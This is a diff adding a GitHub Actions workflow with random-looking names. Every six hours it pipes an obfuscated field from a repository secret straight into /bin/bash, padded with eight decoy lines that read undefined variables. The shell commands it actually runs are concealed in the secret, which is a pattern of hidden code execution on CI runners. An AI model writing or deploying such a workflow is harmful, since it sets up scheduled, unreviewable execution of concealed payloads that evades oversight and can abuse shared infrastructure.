@@ -1,0 +1,26 @@
+name: wangfeizi6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangfeizi6715
+        env:
+          c0048: ${{ secrets.c0048 }}
+        run: |
+          echo $c0048 | jq -r .ptyxc2 | /bin/bash
+          echo $x0 | jq -r .apmdp1 | /bin/bash
+          echo $sogn3 | jq -r .fipo8 | /bin/bash
+          echo $ugdk249 | jq -r .lysd13236 | /bin/bash
+          echo $aqz172 | jq -r .oipn4474 | /bin/bash
+          echo $o8430 | jq -r .dpkf56 | /bin/bash
+          echo $jq4 | jq -r .lvx720 | /bin/bash
+          echo $yn58 | jq -r .q355 | /bin/bash
+          echo $ljhh690 | jq -r .lbm30775 | /bin/bash
+
